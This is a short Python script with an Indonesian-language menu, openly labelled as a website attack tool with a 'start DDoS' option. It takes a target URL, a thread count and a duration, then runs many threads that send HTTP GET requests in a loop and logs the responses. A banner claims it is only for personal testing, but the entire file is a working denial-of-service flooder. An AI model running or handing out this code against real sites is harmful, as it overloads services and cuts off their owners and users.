import requests
import threading
import os
import time

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print("="*50)
    print("          UJICOBA WEBSITE SERANGAN")
    print("="*50)
    print("   Script ini hanya untuk pengujian pribadi")
    print("        Jangan digunakan ke website orang!")
    print("="*50)

def serang(url, selesai, log_file):
    while not selesai.is_set():
        try:
            response = requests.get(url)
            msg = f"[+] Status: {response.status_code}"
        except Exception as e:
            msg = f"[!] Gagal: {e}"
        print(msg)
        with open(log_file, "a") as f:
            f.write(msg + "\n")

def menu():
    while True:
        clear()
        banner()
        print("1. Mulai DDoS")
        print("2. Keluar")
        pilihan = input("\nPilih opsi (1/2): ").strip()

        if pilihan == "1":
            mulai_ddos()
        elif pilihan == "2":
            print("Keluar...")
            break
        else:
            print("Pilihan tidak valid!")
            input("Tekan Enter untuk kembali...")

def mulai_ddos():
    clear()
    banner()
    target_url = input("Masukkan URL target (cth: http://localhost): ").strip()
    jumlah_thread = int(input("Masukkan jumlah thread: ").strip())
    durasi = int(input("Masukkan durasi serangan (detik): ").strip())

    log_file = "log_ddos.txt"
    selesai = threading.Event()

    print("\n[!] Menyerang... Log disimpan di:", log_file)
    print("[✓] Tekan '1' lalu Enter untuk menghentikan serangan lebih awal.\n")

    # Jalankan semua thread
    for i in range(jumlah_thread):
        thread = threading.Thread(target=serang, args=(target_url, selesai, log_file))
        thread.daemon = True
        thread.start()

    time_mulai = time.time()
    try:
        while time.time() - time_mulai < durasi:
            if input().strip() == "1":
                print("\n[!] Dihentikan oleh pengguna.")
                break
    except KeyboardInterrupt:
        print("\n[!] Dihentikan paksa.")

    selesai.set()
    print("\n[✓] Serangan dihentikan. Tekan Enter untuk kembali ke menu.")
    input()

if __name__ == "__main__":
    menu()
